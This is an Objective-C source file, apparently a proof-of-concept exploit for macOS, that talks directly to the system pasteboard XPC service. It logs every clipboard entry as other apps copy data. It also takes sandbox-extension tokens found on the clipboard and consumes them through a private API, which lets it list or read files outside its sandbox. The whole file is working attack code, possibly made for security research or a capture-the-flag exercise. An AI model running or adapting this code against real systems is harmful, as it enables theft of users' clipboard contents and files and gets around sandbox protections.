#import <Foundation/Foundation.h>


uint64_t generation;
const unsigned char *uuid_data;
xpc_connection_t connection;
//uint64_t change;

int64_t sandbox_extension_consume(const char *extension_token);


void list_files_in_dir(NSString *directoryPath) {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSArray *files = [fileManager contentsOfDirectoryAtPath:directoryPath error:&error];
    
    if (error) {
        NSLog(@"Error reading directory: %@", [error localizedDescription]);
        return;
    }
    
    NSLog(@"Contents of directory %@:", directoryPath);
    for (NSString *file in files) {
        NSLog(@"%@", file);
    }
}


void create() {
    NSLog(@"CREATE");
    xpc_object_t message = xpc_dictionary_create_empty();
    xpc_dictionary_set_string(message, "com.apple.pboard.pboardName", "Apple CFPasteboard general");
    xpc_dictionary_set_string(message, "com.apple.pboard.message", "com.apple.pboard.create");
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(connection, message);
    if (xpc_get_type(reply) == XPC_TYPE_DICTIONARY){
        NSLog(@"CREATE - REPLY: %s", xpc_copy_description(reply));

        //change = xpc_dictionary_get_uint64(reply, "com.apple.pboard.change");
        uuid_data = xpc_dictionary_get_uuid(reply, "com.apple.pboard.uuid");
        generation = xpc_dictionary_get_uint64(reply, "com.apple.pboard.generation");
    }
}

void get_counts(){
    NSLog(@"GET COUNTS");
    xpc_object_t message = xpc_dictionary_create_empty();
    xpc_dictionary_set_string(message, "com.apple.pboard.pboardName", "Apple CFPasteboard general");
    xpc_dictionary_set_string(message, "com.apple.pboard.message", "com.apple.pboard.get-counts");
    xpc_dictionary_set_uuid(message, "com.apple.pboard.uuid", uuid_data);
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(connection, message);
    if (xpc_get_type(reply) == XPC_TYPE_DICTIONARY){
        //NSLog(@"GET COUNTS - REPLY: %s", xpc_copy_description(reply));

        //change = xpc_dictionary_get_uint64(reply, "com.apple.pboard.change");
        generation = xpc_dictionary_get_uint64(reply, "com.apple.pboard.generation");
    }
}


xpc_object_t refresh_cache(){
    NSLog(@"REFRESH CACHE");
    xpc_object_t message = xpc_dictionary_create_empty();
    xpc_dictionary_set_string(message, "com.apple.pboard.pboardName", "Apple CFPasteboard general");
    xpc_dictionary_set_string(message, "com.apple.pboard.message", "com.apple.pboard.refresh-cache");
    xpc_dictionary_set_uuid(message, "com.apple.pboard.uuid", uuid_data);
    xpc_dictionary_set_bool(message, "com.apple.pboard.includeAvailableData", false);
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(connection, message);
    if (xpc_get_type(reply) == XPC_TYPE_DICTIONARY){
        //NSLog(@"REFRESH CACHE - REPLY: %s", xpc_copy_description(reply));

        xpc_object_t arr = xpc_dictionary_get_array(reply, "com.apple.pboard.entry-array");
        if (xpc_array_get_count(arr) > 0){
            return arr;
        }
    }

    return NULL;
}


void request_data(xpc_object_t array, size_t idx){

    xpc_object_t message = xpc_dictionary_create_empty();
    xpc_dictionary_set_string(message, "com.apple.pboard.pboardName", "Apple CFPasteboard general");
    xpc_dictionary_set_string(message, "com.apple.pboard.message", "com.apple.pboard.request-data");
    xpc_dictionary_set_uint64(message, "com.apple.pboard.generation", generation);
    xpc_dictionary_set_uuid(message, "com.apple.pboard.uuid", uuid_data);
    
    xpc_object_t entry = xpc_array_get_value(array,idx);

    const char *entry_name = xpc_dictionary_get_string(entry, "flavorName");
    xpc_dictionary_set_value(message, "com.apple.pboard.entry", entry);
    //NSLog(@"REQUEST '%s': %s", entry_name, xpc_copy_description(message));
    xpc_connection_send_message_with_reply(connection, message, dispatch_get_main_queue(), ^(xpc_object_t reply){
        if (xpc_get_type(reply) == XPC_TYPE_DICTIONARY){
            //NSLog(@"REQUEST DATA - REPLY: %s", xpc_copy_description(reply));

            int64_t err_no = xpc_dictionary_get_int64(reply, "com.apple.pboard.error");
            if (err_no != 0){
                NSLog(@"Error getting '%s'", entry_name);
            }
            else{
                size_t data_length;

                xpc_object_t entry = xpc_dictionary_get_dictionary(reply, "com.apple.pboard.entry");

                const void *extracted_data = xpc_dictionary_get_data(entry, "data", &data_length);
                if (extracted_data) {
                    NSData *d = [NSData dataWithBytes:extracted_data length:data_length];
                    NSString *extString = [[NSString alloc] initWithBytes:extracted_data length:data_length encoding:NSUTF8StringEncoding];
                    if (extString)
                        NSLog(@"Extracted '%s': %@", entry_name, extString);
                    else
                        NSLog(@"Extracted '%s': %@", entry_name, d);

                    if (strcmp(entry_name, "com.apple.security.sandbox-extension-dict") == 0 && extracted_data){
                        NSData *plistData = [NSData dataWithBytes:extracted_data length:data_length];
                        NSPropertyListFormat format;
                        NSDictionary *plist = [NSPropertyListSerialization propertyListWithData:plistData options:0 format:&format error:nil];

                        NSString *t_filepath = [[plist allKeys] firstObject];
                        NSLog(@"FILEPATH: %@", t_filepath);
                        NSString *t = [[NSString alloc] initWithBytes:[[plist objectForKey:t_filepath] bytes] length:[[plist objectForKey:t_filepath] length] encoding:NSUTF8StringEncoding];
                        NSLog(@"TOKEN: %@", t);
                        int64_t status = sandbox_extension_consume([t UTF8String]);
                        if (status == 0) {
                            NSLog(@"OOOK TOKEN CONSUMED");
                            
                            BOOL isDirectory;
                            if ([[NSFileManager defaultManager] fileExistsAtPath:t_filepath isDirectory:&isDirectory] && isDirectory) {
                                list_files_in_dir(t_filepath);
                            }
                            else{
                                NSData *flag = [NSData dataWithContentsOfFile:t_filepath];
                                NSLog(@"FILE DATA: %@", flag);
                            }
                        }
                        else{
                            NSLog(@"KO");
                        }
                    }
                } else {
                    NSLog(@"Failed to extract '%s'", entry_name);
                }
            }
        }
    });
}



int main(){

    NSLog(@"My pid: %d", getpid());
    dispatch_queue_t queue = dispatch_queue_create("com.example.paste", DISPATCH_QUEUE_SERIAL);
    connection = xpc_connection_create_mach_service("com.apple.pasteboard.1", queue, 0x0);  //XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
    
    //NSLog(@"CONNECTION: %p", connection);
    xpc_connection_set_event_handler(connection, ^(xpc_object_t obj) {
        NSLog(@"Received message in generic event handler: %s", xpc_copy_description(obj));
        if (XPC_TYPE_ERROR == xpc_get_type(obj)){
            NSLog(@"ERROR: EXIT");
            exit(0);
        }
        else{
            xpc_object_t data_arr;
            const char *msg = xpc_dictionary_get_string(obj, "com.apple.pboard.message");
            if (strcmp(msg, "com.apple.pboard.invalidate-cache") == 0){
                get_counts();
                data_arr = refresh_cache();
                if (NULL != data_arr){
                    for (size_t i = 0; i < xpc_array_get_count(data_arr); i++)
                        request_data(data_arr, i);
                }
            }
            else if (strcmp(msg, "com.apple.pboard.invalidate-entries") == 0 ){                
                //create();
                //get_counts();
                //while (1){
                //    sleep(5);
                //get_counts();
                data_arr = refresh_cache();
                if (NULL != data_arr){
                    for (size_t i = 0; i < xpc_array_get_count(data_arr); i++)
                        request_data(data_arr, i);
                }
                NSLog(@"----------------------------------------");
                //}

            }
        }
    });
    
    xpc_connection_resume(connection);
    create();
    dispatch_main();

}
